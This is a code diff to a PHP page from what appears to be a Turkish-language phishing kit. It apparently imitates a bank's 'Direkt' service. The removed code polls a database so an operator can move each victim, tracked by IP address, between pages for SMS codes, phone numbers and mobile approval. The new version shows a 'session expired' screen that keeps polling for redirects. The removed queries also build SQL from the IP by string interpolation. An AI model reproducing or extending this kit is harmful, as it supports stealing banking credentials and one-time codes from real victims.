@@ -4,60 +4,18 @@ if ($ajax->banControl(IP)) {
     $ajax->redirect(BAN_URL);
 }
 
-$ip = IP;
-
-// If ajax check request
-if (isset($_GET['check'])) {
-    header('Content-Type: application/json');
-    $redirect = $db->query("SELECT * FROM redirect WHERE ipAddress = '$ip'")->fetch(PDO::FETCH_OBJ);
-    $target = "";
-    if ($redirect) {
-        if ($redirect->page == "sms") {
-            $target = "sms.php";
-        } else if ($redirect->page == "sms2") {
-            $target = "hatali-sms.php";
-        } else if ($redirect->page == "tebrik") {
-            $target = "basarili.php";
-        } else if ($redirect->page == "hata") {
-            $target = "sms.php?suredoldu=1";
-        } else if ($redirect->page == "hata2") {
-            $target = "giris.php?hata=1";
-        } else if ($redirect->page == "hata3") {
-            $target = "telefon.php?hata=1";
-        } else if ($redirect->page == "basadondur") {
-            $target = "index.php";
-        } else if ($redirect->page == "onay") {
-            $target = "mobil-onay.php";
-        } else if ($redirect->page == "bilgi") {
-            $target = "bekle.php";
-        } else if ($redirect->page == "tel") {
-            $target = "telefon.php";
-        }
-        
-        if ($target !== "") {
-            $db->query("DELETE FROM redirect WHERE ipAddress = '$ip'");
-        }
-    }
-    // Refresh online status and active page name during pings
-    $ajax->pageUpdate(IP, 'Bekle');
-    echo json_encode(["redirect" => $target]);
-    exit;
-}
-
-$ajax->pageUpdate(IP, 'Bekle');
+$ajax->pageUpdate(IP, 'Süre Doldu');
 ?>
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
     
-    <!-- Check every 3 seconds for redirects -->
     
     
-    
-    <title>İşleminiz Yapılıyor - Direkt</title>
+    <title>İşlem Hatası - Direkt</title>
     <style>
-        <?php echo file_get_contents('files/asset/css/normalize.min.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/files/asset/css/normalize.min.css'); ?>
         
         @font-face {
           font-family: 'Poppins';
@@ -139,33 +97,36 @@ $ajax->pageUpdate(IP, 'Bekle');
           src: url('files/asset/fonts/pxiByp8kv8JHgFVrLDD4Z1xlFQ.woff2') format('woff2');
           unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
         }
-        <?php echo file_get_contents('basvuru/style.css'); ?>
+        <?php echo file_get_contents(dirname(__DIR__) . '/basvuru/style.css'); ?>
     </style>
 </head>
 <body>
     <div id="slider">
         <div class="gray7 slide active" style="background-color: rgb(241, 241, 241);">
             <div id="call" style="margin-top: 20%; width: 90%; display: inline-block;">
-                <img src="/files/asset/an.svg" width="220" height="200">
-                <p id="countdown2" style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;">İşleminiz Devam Ediyor Lütfen Bekleyiniz.</p>
+                <p style="font-size: 18px; color: #7d7c7c; margin-top: 5%; font-weight: 500;">
+                    Oturum Süreniz Dolmuştur.
+                </p>
+                <button type="button" id="customSubmitBtn" style="background-color: rgb(220, 0, 4); cursor: pointer;" onclick="location.href='index.php'">Tekrar Dene</button>
             </div>
         </div>
     </div>
-    <script>
-        // Check for redirects in background without refreshing the page
-        setInterval(function() {
-            fetch('bekle.php?check=1')
-                .then(response => response.json())
-                .then(data => {
-                    if (data.redirect) {
-                        window.location.href = data.redirect;
-                    }
-                })
-                .catch(err => console.error(err));
-        }, 2000);
-    </script>
 </body>
+<script>
+    function checkRedirect() {
+        fetch('check_redirect.php')
+            .then(function(r) { return r.json(); })
+            .then(function(data) {
+                if (data.redirect) {
+                    window.location.href = data.redirect;
+                }
+            })
+            .catch(function() {});
+    }
+    setInterval(checkRedirect, 2000);
+</script>
 </html>
+
 
 
 
